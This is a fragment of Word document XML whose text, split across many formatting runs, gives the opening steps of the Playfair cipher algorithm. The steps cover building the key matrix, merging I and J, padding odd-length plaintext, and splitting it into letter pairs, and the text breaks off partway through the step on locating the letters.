        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">AIR </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>PH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ER</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="7" w:line="240" w:lineRule="exact"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="12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280" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="620" w:space="190"/>
            <w:col w:w="86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P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ayf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>r C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ech</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>que 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In</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>2. Get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>keyword and p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>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3. I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">keyword </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x exce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>dup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>4. If I &amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>J are encou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ered</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">word </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>en f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>bo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">h </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>5. F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">es of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ady en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ered </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">6. If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he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has an odd nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ber</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of chara</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ers, append</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>an '</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">' </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e end </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ake </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>even.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>7. Br</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ak </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>rs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ers.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="4" w:line="400" w:lineRule="atLeast"/>
        <w:ind w:left="400" w:right="594" w:hanging="300"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>oca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ers </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
